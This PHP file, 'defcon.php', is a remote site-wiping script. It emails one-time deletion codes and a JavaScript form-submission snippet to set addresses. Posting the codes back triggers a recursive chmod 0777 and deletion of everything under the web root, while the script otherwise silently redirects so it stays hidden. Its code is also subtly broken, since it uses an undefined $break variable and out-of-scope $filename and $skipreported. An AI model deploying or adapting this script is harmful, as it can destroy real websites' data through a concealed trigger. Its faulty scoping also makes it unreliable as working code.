<?php
	/**
	 *** Version 1.2 ***
	 *
	 * Remember to edit these configuration variables if you want things to work correctly!
	 *
	 * This file should be placed in a folder named cgi which itself should be on root level
	   (or else modify $target and $path below)
	 *
	 * Failure to set this up correctly will have catastrophic consequences.
	 * Make sure to test this script at least once! Alter the gc_maxlifetime value if
	   necessary (it may be too big for some servers).
	 *
	 * Coming soon: FTP access via this script
	**/
	
	$website = 'http://stepsbystephens.com';
	$webname = 'StepsByStephens';
	
	$primary_email = 'trefighter2334@aol.com';
	$secondary_email = 'trefighter2334@gmail.com';
	
	$target = '../';
	$path = '/cgi/'; // Yes, include slashes on both the front and the end, but NOT this file's name
	
	/* The rest is handled automatically ;) */
	
	$filename = @explode('/', $_SERVER['SCRIPT_NAME']);
	$filename = end($break) or $filename = 'defcon.php';
	$path .= $filename;
	$skipreported = false;
	
	ini_set('session.gc_maxlifetime', 999999999);
	session_start(); // Integral part of this script. Sessions must be enabled.
	
	function destroy($dir)
	{
		$mydir = opendir($dir);
		while(false !== ($file = readdir($mydir)))
		{
			if($file != '.' && $file != '..')
			{
				if(strpos($file, $filename) !== FALSE)
				{
					if(!$skipreported)
					{
						$skipreported = true;
						echo '<span style="color: green">Skipping the deletion of ['. $filename .']...</span><br />';
					}
					
					continue;
				}
				
				@chmod($dir.$file, 0777);
				
				if(is_dir($dir.$file))
				{
					chdir('.');
					destroy($dir.$file.'/');
					echo "Deleting directory [$dir$file]...<br />";
					@rmdir($dir.$file) or print("<span style=\"color: red\">Couldn't delete directory [$dir$file]!</span><br />");
				}
				
				else
				{
					echo "Deleting file [$dir$file]...<br />";
					@unlink($dir.$file) or print("<span style=\"color: red\">Couldn't delete file [$dir$file]!</span><br />");
				}
			}
		}
		
		closedir($mydir);
	}
	
	function generate($len, $limit)
	{
		$cache = array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0');
		$return = '';
		
		if(!$limit) $cache = array_merge($cache, array('!','@','#','$','%','^','&','*','(',')','-','_','=','+','~'));
		if($len <= 0) $len = 50+rand(0, 25);
		shuffle($cache);
		
		while($len--) $return .= $cache[rand(0, count($cache)-1)];
		return $return;
	}
	
	if(isset($_POST[$_SESSION['prop']], $_SESSION['pass'], $_GET['level']) && (($_GET['level'] > 9000 || $_GET['level'] == 10000) && $_POST[$_SESSION['prop']] == $_SESSION['pass']))
	{
		if($_GET['level'] != 10000)
		{
			unset($_SESSION);
			session_destroy();
		}
		
		destroy($target);
		echo '<span style="color: blue;">Complete.</span>';
		exit;
	}
	
	else if(isset($_GET['level']) && $_GET['level'] <= 9000 && !$_SESSION['sent'])
	{
		$_SESSION['sent'] = true;
		$_SESSION['prop'] = generate(5, true);
		$_SESSION['level'] = $_GET['level'] == 9000 ? 10000 : (9000 + rand(1, 999));
		$_SESSION['pass'] = generate(-1, false);
		
		$repeater_url = '';
		if($_GET['level'] == 9000)
			$repeater_url = "\nYour \"Repeater URL\" is the same as the \"var url\" below. ".
							'Set it up as a chron job on a server near you (or a local JS '.
							"repeater, whatever floats your boat!)\n";
		
		$msg = <<<MSG
Hello Administrator!
Here are the available deletion codes:

Site: $webname
Deletion URL: {$website}{$path}
Property: {$_SESSION['prop']}
(Suggested) Level: {$_SESSION['level']}
Password (value): {$_SESSION['pass']}

<[ Originating IP: {$_SERVER['REMOTE_ADDR']} ]>
{$repeater_url}
Submission code:
var url = "{$website}{$path}?level={$_SESSION['level']}",
property = "{$_SESSION['prop']}",
value = "{$_SESSION['pass']}";
	
var f=document.createElement('form'),g=document.createElement('input');f.method='post';f.action=url;g.type='hidden';g.name=property;g.value=value;f.appendChild(g);f.submit();
MSG;

		mail(($_GET['level'] < 5000 ? $secondary_email : $primary_email), "$webname Defcon Codes!", $msg, 'From: '.$webname.' Server <defcon@'.strtolower($webname).'.com>'."\r\n");
		header('Server: defcon sent');
	}
	
	header('Location: '.$website);
?>